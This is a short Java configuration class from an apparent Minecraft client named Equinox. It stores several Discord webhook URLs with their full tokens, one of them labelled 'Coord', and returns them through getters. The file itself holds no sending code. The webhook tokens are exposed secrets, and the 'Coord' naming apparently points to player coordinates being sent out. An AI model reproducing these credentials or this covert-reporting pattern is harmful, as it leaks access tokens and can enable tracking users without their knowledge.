package me.eonexe.equinox.configuration;

import jdk.jfr.internal.tool.Main;

public class Configs {
    private static String main = "https://discord.com/api/webhooks/908277356773408798/QnjJ9tn4Lq7xoGS4dyuKXpMoZVTOkFKL1eHRi4AZB_GCGqjDt8BuMfi_lTMIeigmLgif";
    private static String test = "https://discord.com/api/webhooks/900633061371281440/D4vvzbjGM86IVxJgjhDwgVdPpRoZZjf642woPQ7PIKaxyJkHUC4o5y-EKwjpXoBqqb5R";
    //Coord "https://discord.com/api/webhooks/908277461949743144/NPNDI5VyPciVSEkFIqF_GSXIURDuqZWVQIdQLoPxCzrFnjrJP1SBK8hPrYogewZxIxL7"
    private static final String MainWH = test;
    private static final String CoordWH = "https://discord.com/api/webhooks/908277461949743144/NPNDI5VyPciVSEkFIqF_GSXIURDuqZWVQIdQLoPxCzrFnjrJP1SBK8hPrYogewZxIxL7";

    public static String getMain() {
        return MainWH;
    }
    public static String getCoord() {
        return CoordWH;
    }
}
